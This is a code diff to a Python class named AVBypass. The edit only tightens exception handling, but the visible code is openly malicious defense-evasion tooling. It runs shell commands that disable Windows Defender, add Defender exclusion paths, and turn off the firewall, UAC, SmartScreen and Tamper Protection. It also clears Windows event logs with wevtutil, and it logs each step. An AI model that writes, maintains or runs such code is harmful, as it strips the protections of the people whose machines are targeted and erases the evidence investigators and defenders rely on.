@@ -48,7 +48,7 @@ class AVBypass:
         for cmd in commands:
             try:
                 subprocess.run(cmd, shell=True, capture_output=True)
-            except:
+            except Exception:
                 pass
 
         self.log("[AV BYPASS] Windows Defender disabled")
@@ -67,7 +67,7 @@ class AVBypass:
             cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\'"'
             try:
                 subprocess.run(cmd, shell=True, capture_output=True)
-            except:
+            except Exception:
                 pass
 
         self.log("[AV BYPASS] Added exclusions")
@@ -82,7 +82,7 @@ class AVBypass:
         for cmd in commands:
             try:
                 subprocess.run(cmd, shell=True, capture_output=True)
-            except:
+            except Exception:
                 pass
 
         self.log("[AV BYPASS] Firewall disabled")
@@ -108,7 +108,7 @@ class AVBypass:
             ], shell=True, capture_output=True)
 
             self.log("[AV BYPASS] UAC disabled")
-        except:
+        except Exception:
             pass
 
     def disable_smartscreen(self):
@@ -119,7 +119,7 @@ class AVBypass:
                 shell=True, capture_output=True
             )
             self.log("[AV BYPASS] SmartScreen disabled")
-        except:
+        except Exception:
             pass
 
     def disable_tamper_protection(self):
@@ -130,7 +130,7 @@ class AVBypass:
                 shell=True, capture_output=True
             )
             self.log("[AV BYPASS] Tamper Protection disabled")
-        except:
+        except Exception:
             pass
 
     def clear_event_logs(self):
@@ -140,7 +140,7 @@ class AVBypass:
         for log in logs:
             try:
                 subprocess.run(f'wevtutil cl "{log}"', shell=True, capture_output=True)
-            except:
+            except Exception:
                 pass
 
         self.log("[AV BYPASS] Event logs cleared")
